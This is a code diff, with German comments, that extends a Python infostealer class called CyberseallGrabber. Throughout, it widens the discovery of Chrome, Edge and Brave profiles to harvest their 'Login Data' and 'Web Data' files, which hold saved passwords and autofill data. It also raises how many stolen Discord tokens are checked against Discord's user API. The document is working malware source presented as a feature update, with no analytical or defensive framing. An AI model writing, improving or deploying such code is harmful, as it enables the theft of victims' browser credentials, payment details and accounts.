@@ -153,11 +153,21 @@ class CyberseallGrabber:
             # Füge Browser mit Profilen hinzu
             for browser_name, base_path in browser_bases.items():
                 if os.path.exists(base_path):
-                    # Prüfe verschiedene Profile
-                    for profile in ['Default', 'Profile 1', 'Profile 2', 'Profile 3']:
+                    # Prüfe alle verfügbaren Profile (erweitert auf 10 Profile)
+                    for profile in ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5', 'Profile 6', 'Profile 7', 'Profile 8', 'Profile 9', 'Profile 10']:
                         profile_path = os.path.join(base_path, profile)
                         if os.path.exists(profile_path):
                             paths[f'{browser_name}-{profile}'] = profile_path
+                    
+                    # Zusätzlich: Automatische Erkennung aller Profile
+                    try:
+                        for item in os.listdir(base_path):
+                            item_path = os.path.join(base_path, item)
+                            if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
+                                if f'{browser_name}-{item}' not in paths:
+                                    paths[f'{browser_name}-{item}'] = item_path
+                    except:
+                        pass
                     
                     # Fallback für Browser ohne Profile
                     if browser_name not in [p.split('-')[0] for p in paths.keys()]:
@@ -320,7 +330,7 @@ class CyberseallGrabber:
                                     pass
                 
                 # Validiere Fallback-Tokens
-                for token in fallback_tokens[:5]:  # Nur die ersten 5 testen
+                for token in fallback_tokens[:15]:  # Erhöht von 5 auf 15 testen
                     try:
                         headers = {'Authorization': token, 'Content-Type': 'application/json'}
                         res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
@@ -333,7 +343,7 @@ class CyberseallGrabber:
 
     def validate_tokens(self):
         valid_tokens = []
-        for token in self.t[:10]:
+        for token in self.t[:25]:  # Erhöht von 10 auf 25 Tokens
             try:
                 headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                 
@@ -477,7 +487,8 @@ class CyberseallGrabber:
                 
                 for chrome_base in chrome_paths:
                     if os.path.exists(chrome_base):
-                        for profile in ["Default", "Profile 1", "Profile 2"]:
+                        # Erweiterte Profil-Suche für Chrome
+                        for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                             profile_path = os.path.join(chrome_base, profile)
                             if os.path.exists(profile_path):
                                 simple_browsers.append({
@@ -486,6 +497,23 @@ class CyberseallGrabber:
                                     "base_path": chrome_base,
                                     "login_file": "Login Data"
                                 })
+                        
+                        # Automatische Erkennung aller Chrome-Profile
+                        try:
+                            for item in os.listdir(chrome_base):
+                                item_path = os.path.join(chrome_base, item)
+                                if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
+                                    # Prüfe ob bereits hinzugefügt
+                                    already_added = any(browser["name"] == f"Chrome-{item}" for browser in simple_browsers)
+                                    if not already_added:
+                                        simple_browsers.append({
+                                            "name": f"Chrome-{item}",
+                                            "path": item_path,
+                                            "base_path": chrome_base,
+                                            "login_file": "Login Data"
+                                        })
+                        except:
+                            pass
                 
 
                 edge_paths = [
@@ -496,7 +524,8 @@ class CyberseallGrabber:
                 
                 for edge_base in edge_paths:
                     if os.path.exists(edge_base):
-                        for profile in ["Default", "Profile 1"]:
+                        # Erweiterte Profil-Suche für Edge
+                        for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                             profile_path = os.path.join(edge_base, profile)
                             if os.path.exists(profile_path):
                                 simple_browsers.append({
@@ -505,11 +534,29 @@ class CyberseallGrabber:
                                     "base_path": edge_base,
                                     "login_file": "Login Data"
                                 })
+                        
+                        # Automatische Erkennung aller Edge-Profile
+                        try:
+                            for item in os.listdir(edge_base):
+                                item_path = os.path.join(edge_base, item)
+                                if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
+                                    # Prüfe ob bereits hinzugefügt
+                                    already_added = any(browser["name"] == f"Edge-{item}" for browser in simple_browsers)
+                                    if not already_added:
+                                        simple_browsers.append({
+                                            "name": f"Edge-{item}",
+                                            "path": item_path,
+                                            "base_path": edge_base,
+                                            "login_file": "Login Data"
+                                        })
+                        except:
+                            pass
                 
 
                 brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
                 if os.path.exists(brave_base):
-                    for profile in ["Default", "Profile 1"]:
+                    # Erweiterte Profil-Suche für Brave
+                    for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                         profile_path = os.path.join(brave_base, profile)
                         if os.path.exists(profile_path):
                             simple_browsers.append({
@@ -518,6 +565,23 @@ class CyberseallGrabber:
                                 "base_path": brave_base,
                                 "login_file": "Login Data"
                             })
+                    
+                    # Automatische Erkennung aller Brave-Profile
+                    try:
+                        for item in os.listdir(brave_base):
+                            item_path = os.path.join(brave_base, item)
+                            if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
+                                # Prüfe ob bereits hinzugefügt
+                                already_added = any(browser["name"] == f"Brave-{item}" for browser in simple_browsers)
+                                if not already_added:
+                                    simple_browsers.append({
+                                        "name": f"Brave-{item}",
+                                        "path": item_path,
+                                        "base_path": brave_base,
+                                        "login_file": "Login Data"
+                                    })
+                    except:
+                        pass
                 
 
                 opera_base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
@@ -896,26 +960,62 @@ class CyberseallGrabber:
 
             browsers = {}
             
-            # Chrome Varianten
+            # Chrome Varianten (erweitert)
             chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
             if os.path.exists(chrome_base):
-                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
+                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                     profile_path = os.path.join(chrome_base, profile, "Web Data")
                     if os.path.exists(profile_path):
                         browsers[f'Chrome-{profile}'] = profile_path
+                
+                # Automatische Erkennung aller Chrome-Profile
+                try:
+                    for item in os.listdir(chrome_base):
+                        item_path = os.path.join(chrome_base, item)
+                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
+                            webdata_path = os.path.join(item_path, "Web Data")
+                            if os.path.exists(webdata_path) and f'Chrome-{item}' not in browsers:
+                                browsers[f'Chrome-{item}'] = webdata_path
+                except:
+                    pass
             
-            # Edge Varianten
+            # Edge Varianten (erweitert)
             edge_base = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
             if os.path.exists(edge_base):
-                for profile in ["Default", "Profile 1", "Profile 2"]:
+                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                     profile_path = os.path.join(edge_base, profile, "Web Data")
                     if os.path.exists(profile_path):
                         browsers[f'Edge-{profile}'] = profile_path
+                
+                # Automatische Erkennung aller Edge-Profile
+                try:
+                    for item in os.listdir(edge_base):
+                        item_path = os.path.join(edge_base, item)
+                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
+                            webdata_path = os.path.join(item_path, "Web Data")
+                            if os.path.exists(webdata_path) and f'Edge-{item}' not in browsers:
+                                browsers[f'Edge-{item}'] = webdata_path
+                except:
+                    pass
             
-            # Brave
-            brave_path = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Web Data")
-            if os.path.exists(brave_path):
-                browsers['Brave'] = brave_path
+            # Brave (erweitert)
+            brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
+            if os.path.exists(brave_base):
+                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
+                    profile_path = os.path.join(brave_base, profile, "Web Data")
+                    if os.path.exists(profile_path):
+                        browsers[f'Brave-{profile}'] = profile_path
+                
+                # Automatische Erkennung aller Brave-Profile
+                try:
+                    for item in os.listdir(brave_base):
+                        item_path = os.path.join(brave_base, item)
+                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
+                            webdata_path = os.path.join(item_path, "Web Data")
+                            if os.path.exists(webdata_path) and f'Brave-{item}' not in browsers:
+                                browsers[f'Brave-{item}'] = webdata_path
+                except:
+                    pass
             
             # Opera
             opera_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Web Data")
